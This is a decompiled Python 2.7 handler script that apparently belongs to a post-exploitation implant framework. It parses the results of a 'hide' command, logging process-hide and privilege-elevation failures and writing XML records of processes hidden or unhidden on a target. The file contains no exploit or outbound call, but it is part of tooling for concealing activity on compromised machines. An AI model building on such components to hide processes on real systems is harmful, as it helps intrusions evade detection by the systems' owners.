# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Hide_DataHandler.py


def DataHandlerMain(namespace, InputFilename, OutputFilename):
    import mcl.imports
    import mcl.data.Input
    import mcl.data.Output
    import mcl.status
    import mcl.target
    import mcl.object.Message
    mcl.imports.ImportNamesWithNamespace(namespace, 'mca.security.cmd.hide', globals())
    input = mcl.data.Input.GetInput(InputFilename)
    output = mcl.data.Output.StartOutput(OutputFilename, input)
    output.Start('Hide', 'hide', [])
    msg = mcl.object.Message.DemarshalMessage(input.GetData())
    if input.GetStatus() != mcl.status.MCL_SUCCESS:
        errorMsg = msg.FindMessage(mcl.object.Message.MSG_KEY_RESULT_ERROR)
        moduleError = errorMsg.FindU32(mcl.object.Message.MSG_KEY_RESULT_ERROR_MODULE)
        osError = errorMsg.FindU32(mcl.object.Message.MSG_KEY_RESULT_ERROR_OS)
        if moduleError == ERR_LIBRARY_CALL_FAILED:
            import mcl.hiding.errors.process_hide
            output.RecordModuleError(moduleError, 0, errorStrings)
            output.RecordModuleError(osError, 0, mcl.hiding.errors.process_hide.errorStrings)
        elif moduleError == ERR_JUMPUP_FAILED:
            output.RecordModuleError(moduleError, 0, errorStrings)
            import mcl.privilege.errors
            output.RecordModuleError(osError, 0, mcl.privilege.errors.errorStrings)
        else:
            output.RecordModuleError(moduleError, osError, errorStrings)
        output.EndWithStatus(input.GetStatus())
        return True
    results = Result()
    results.Demarshal(msg)
    from mcl.object.XmlOutput import XmlOutput
    xml = XmlOutput()
    if results.type == RESULT_TYPE_PROCESS_HIDE:
        xml.Start('Hidden')
        xml.AddAttribute('type', 'Process')
        xml.AddAttribute('value', results.item)
    elif results.type == RESULT_TYPE_PROCESS_UNHIDE:
        xml.Start('Unhidden')
        xml.AddAttribute('type', 'Process')
        xml.AddAttribute('value', results.item)
    else:
        output.RecordError('Unhandled result type (%u)' % results.type)
        output.EndWithStatus(mcl.target.CALL_FAILED)
        return False
    if len(results.metaData) > 0:
        xml.AddSubElementWithText('MetaData', results.metaData)
    output.RecordXml(xml)
    output.EndWithStatus(mcl.target.CALL_SUCCEEDED)
    return True


if __name__ == '__main__':
    import sys
    try:
        namespace, InputFilename, OutputFilename = sys.argv[1:]
    except:
        print '%s <namespace> <input filename> <output filename>' % sys.argv[0]
        sys.exit(1)

    if DataHandlerMain(namespace, InputFilename, OutputFilename) != True:
        sys.exit(-1)